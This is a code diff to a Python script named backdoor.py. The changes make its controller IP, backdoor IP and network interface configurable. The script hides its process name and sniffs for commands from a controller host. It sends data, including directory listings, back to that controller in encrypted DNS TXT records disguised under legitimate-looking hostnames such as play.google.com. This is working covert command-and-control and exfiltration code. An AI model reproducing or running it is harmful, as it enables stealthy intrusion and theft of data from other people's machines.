@@ -10,10 +10,18 @@ from sys import exit
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./backdoor.py")
-parser.add_argument("destination_host", help="Destination host. IPv4.")
-parser.add_argument("source_host", help="Source host. IPv4.")
+parser.add_argument("controller_ip", help="The IPv4 address of the controller host.")
+parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 args = parser.parse_args()
 
+# Validate the arguments.
+
+CONTROLLER_IP = args.controller_ip
+BACKDOOR_IP = args.backdoor_ip
+NETWORK_INTERFACE = args.interface
+
+# List of legit hostnames
 hostnames = ["play.google.com", 
             "pixel.33across.com", 
             "signaler-pa.clients6.google.com",
@@ -58,7 +66,7 @@ def forge_dns_query(data: str):
         print("Truncating data...")
         encrypted_data = encrypted_data[0:256]
     # Forge the DNS packet with data in the text record.
-    query = IP(dst="10.0.0.159")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
+    query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
     return query
 
 def hide_process_name():
@@ -107,11 +115,10 @@ def packet_handler(pkt):
             send_dns_query(query)
             print("Sent directory contents")
             return
-        if argv[0] == CIPHER:
-            cipher_reset()
+
 
 if __name__ == "__main__":
     # Hide process name.
     hide_process_name()
     # Start listening for packets.
-    sniff(filter="ip src host 10.0.0.159 and not port ssh and udp and not icmp", iface="enp1s0", prn=packet_handler)
+    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
